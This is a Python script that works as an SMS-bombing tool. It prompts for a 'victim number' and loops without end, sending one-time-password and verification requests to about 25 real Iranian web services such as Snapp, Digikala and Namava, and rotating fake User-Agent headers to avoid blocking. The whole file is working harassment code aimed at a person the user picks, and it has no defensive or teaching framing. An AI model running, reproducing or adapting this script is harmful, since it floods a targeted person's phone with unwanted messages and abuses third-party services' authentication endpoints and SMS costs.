import requests  # pip install requests
import time
from time import sleep
import random
import string
from fake_useragent import UserAgent  # pip install fake-useragent


while True:
    number = input('Enter the victim number(9xxxxxxxxx) ~> ')
    if not number.isdigit() or len(number) != 10 or number[0] != '9':
        print('Invalid input. Please enter a valid 10-digit phone number starting with \'9\'.')
        continue

    break

ua = UserAgent()
chars = string.ascii_letters + string.digits
random_password = ''.join(random.choice(chars) for i in range(8))
persian_chars = ['ا', 'ب', 'پ', 'ت', 'ث', 'ج', 'چ', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'ژ', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ',
                 'ع', 'غ', 'ف', 'ق', 'ک', 'گ', 'ل', 'م', 'ن', 'و', 'ه', 'ی']
persian_string = ''

for i in range(6):
    random_index = random.randint(0, len(persian_chars) - 1)
    persian_string += persian_chars[random_index]

while True:
    rhead = {
        'User-Agent': ua.random,
        'Accept': '*/*'
    }

    ### SMS APIs ###

    # Snapp
    snapp_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    snapp_payload = {'cellphone': '+98' + number}
    snapp_req = requests.post(snapp_url, data=snapp_payload, json=rhead)
    print('Snapp: ' + str(snapp_req.status_code))

    # Lendo
    lendo_url = 'https://api.lendo.ir/api/customer/auth/send-otp'
    lendo_payload = {'mobile': '0' + number}
    lendo_req = requests.post(lendo_url, data=lendo_payload, json=rhead)
    print('Lendo: ' + str(lendo_req.status_code))

    # Buskool
    buskool_url = 'https://www.buskool.com/send_verification_code'
    buskool_payload = {'phone': '0' + number}
    buskool_req = requests.post(buskool_url, data=buskool_payload, json=rhead)
    print('Buskool: ' + str(buskool_req.status_code))

    # Torob
    torob_url = 'https://api.torob.com/v4/user/phone/send-pin'
    torob_params = {'phone_number': '0' + number}
    torob_req = requests.get(torob_url, params=torob_params, json=rhead)
    print('Torob: ' + str(torob_req.status_code))

    # DrDr
    drdr_url = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
    drdr_payload = {
        'phoneNumber': number,
        'userType': 'PATIENT'
    }
    drdr_req = requests.post(drdr_url, data=drdr_payload, json=rhead)
    print('DrDr: ' + str(drdr_req.status_code))

    # Itoll
    itoll_url = 'https://app.itoll.ir/api/v1/auth/login'
    itoll_payload = {'mobile': '0' + number}
    itoll_req = requests.post(itoll_url, data=itoll_payload, json=rhead)
    print('Itoll: ' + str(itoll_req.status_code))

    # Telewebion
    telewebion_url = 'https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one'
    telewebion_payload = {
        'code': '98',
        'phone': number,
        'smsStatus': 'default'
    }
    telewebion_req = requests.post(telewebion_url, data=telewebion_payload, json=rhead)
    print('Telewebion: ' + str(telewebion_req.status_code))

    # ArasTag
    arastag_url = 'https://arastag.ir/wp-admin/admin-ajax.php'
    arastag_payload = {
        'action': 'verify_user_login',
        'user': '0' + number,
        'captcha': ''
    }
    arastag_req = requests.post(arastag_url, data=arastag_payload, json=rhead)
    print('ArasTag: ' + str(arastag_req.status_code))

    # Basalam
    basalam_url = 'https://auth.basalam.com/otp-request'
    basalam_payload = {'mobile': '0' + number}
    basalam_req = requests.post(basalam_url, data=basalam_payload, json=rhead)
    print('Basalam: ' + str(basalam_req.status_code))



    # HamrahSport
    hamrahsport_url = 'https://hamrahsport.com/send-otp'
    hamrahsport_payload = {
        'cell': number,
        'name': 'persian_string',
        'agree': '1',
        'send_otp': '1',
        'otp': ''
    }
    hamrahsport_req = requests.post(hamrahsport_url, data=hamrahsport_payload, json=rhead)
    print('HamrahSport: ' + str(hamrahsport_req.status_code))

    # Caropex
    caropex_url = 'https://caropex.com/api/v1/user/login'
    caropex_payload = {'mobile': '0' + number}
    caropex_req = requests.post(caropex_url, data=caropex_payload, json=rhead)
    print('Caropex: ' + str(caropex_req.status_code))

    # TamimPishro
    tamimpishro_url = 'https://www.tamimpishro.com/site/api/v1/user/otp'
    tamimpishro_payload = {'mobile': '0' + number}
    tamimpishro_req = requests.post(tamimpishro_url, data=tamimpishro_payload, json=rhead)
    print('TamimPishro: ' + str(tamimpishro_req.status_code))

    # Gap
    gap_url = 'https://core.gap.im/v1/user/add.json'
    gap_params = {'mobile': '+98' + number}
    gap_req = requests.get(gap_url, params=gap_params, json=rhead)
    print('Gap: ' + str(gap_req.status_code))



    # Khanoumi
    khanoumi_url = 'https://www.khanoumi.com/accounts/sendotp'
    khanoumi_payload = {
        'mobile': '0' + number,
        'redirectUrl': ''
    }
    khanoumi_req = requests.post(khanoumi_url, data=khanoumi_payload, json=rhead)
    print('Khanoumi: ' + str(khanoumi_req.status_code))

    # DigiStyle
    digistyle_url = 'https://www.digistyle.com/users/login-register/'
    digistyle_payload = {'loginRegister[email_phone]': '0' + number}
    digistyle_req = requests.post(digistyle_url, data=digistyle_payload, json=rhead)
    print('DigiStyle: ' + str(digistyle_req.status_code))

    # BaniMode
    banimode_url = 'https://mobapi.banimode.com/api/v2/auth/request'
    banimode_payload = {'phone': '0' + number}
    banimode_req = requests.post(banimode_url, data=banimode_payload, json=rhead)
    print('BaniMode: ' + str(banimode_req.status_code))

    # Timcheh
    timcheh_url = 'https://api.timcheh.com/auth/otp/send'
    timcheh_payload = {'mobile': '0' + number}
    timcheh_req = requests.post(timcheh_url, data=timcheh_payload, json=rhead)
    print('Timcheh: ' + str(timcheh_req.status_code))

    # Achareh
    achareh_url = 'https://api.achareh.co/v2/accounts/login/'
    achareh_payload = {'phone': '98' + number}
    achareh_req = requests.post(achareh_url, data=achareh_payload, json=rhead)
    print('Achareh: ' + str(achareh_req.status_code))

    # MrBilit
    mrbilit_url = 'https://auth.mrbilit.com/api/login/exists/v2'
    mrbilit_params = {
        'mobileOrEmail': '0' + number,
        'source': '2',
        'sendTokenIfNot': 'true'
    }
    mrbilit_req = requests.get(mrbilit_url, params=mrbilit_params, json=rhead)
    print('MrBilit: ' + str(mrbilit_req.status_code))

    # RojaShop
    rojashop_url = 'https://rojashop.com/api/loginRegister'
    rojashop_payload = {
        'mobile': number,
        'withOtp': '1'
    }
    rojashop_req = requests.post(rojashop_url, data=rojashop_payload, json=rhead)
    print('RojaShop: ' + str(rojashop_req.status_code))

    # SafirStores
    safirstores_url = 'https://www.safirstores.com/index.php?route=account%2Flogin%2FgetRandCode'
    safirstores_payload = {'telephone': '0' + number}
    safirstores_req = requests.post(safirstores_url, data=safirstores_payload, json=rhead)
    print('SafirStores: ' + str(safirstores_req.status_code))

    # Digikala
    digikala_url = 'https://api.digikala.com/v1/user/authenticate/'
    digikala_payload = {
        'backUrl': '/',
        'username': '0' + number,
        'otp_call': 'false'
    }
    digikala_req = requests.post(digikala_url, json=digikala_payload, headers=rhead)
    print('Digikala: ' + str(digikala_req.status_code))



    # Doctoreto
    doctoreto_url = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
    doctoreto_payload = {
        'country_id': 205,
        'mobile': number
    }
    doctoreto_req = requests.post(doctoreto_url, json=doctoreto_payload, headers=rhead)
    print('Doctoreto: ' + str(doctoreto_req.status_code))

    
    # SnappApps
    snappapps_url = 'https://api.snapp.ir/api/v1/sms/link'
    snappapps_payload = {'phone': '0' + number}
    snappapps_req = requests.post(snappapps_url, json=snappapps_payload, headers=rhead)
    print('SnappApps: ' + str(snappapps_req.status_code))

    # Namava
    namava_url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
    namava_payload = {'UserName': '+98' + number}
    namava_req = requests.post(namava_url, json=namava_payload, headers=rhead)
    print('Namava: ' + str(namava_req.status_code))

    # FilmNet
    filmnet_url = f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp'
    filmnet_req = requests.get(filmnet_url, json=rhead)
    print('FilmNet: ' + str(filmnet_req.status_code))


    sleep(2)



